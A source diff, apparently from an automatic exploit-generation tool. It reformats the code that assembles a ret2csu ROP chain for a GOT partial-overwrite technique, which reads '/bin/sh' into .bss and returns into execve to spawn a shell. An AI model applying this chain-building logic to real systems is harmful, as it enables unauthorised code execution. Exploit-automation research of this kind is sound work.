@@ -58,32 +58,28 @@ std::vector<SymbolicRopPayload> GotPartialOverwrite::getSymbolicRopPayloadList()
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(m_ctx.getExploit(), "got", "read"),
-        ConstantExpr::create(1, Expr::Int64)
-    )[0];
+        ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
     SymbolicRopPayload read2 = ret2csu->getSymbolicRopPayloadList(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
-        ConstantExpr::create(0, Expr::Int64)
-    )[0];
+        ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
     SymbolicRopPayload read3 = ret2csu->getSymbolicRopPayloadList(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
-        ConstantExpr::create(59, Expr::Int64)
-    )[0];
+        ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
     SymbolicRopPayload read4 = ret2csu->getSymbolicRopPayloadList(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
         ConstantExpr::create(0, Expr::Int64),
-        ConstantExpr::create(0, Expr::Int64)
-    )[0];
+        ConstantExpr::create(0, Expr::Int64))[0];
 
     SymbolicRopPayload part1;
     SymbolicRopPayload part2;
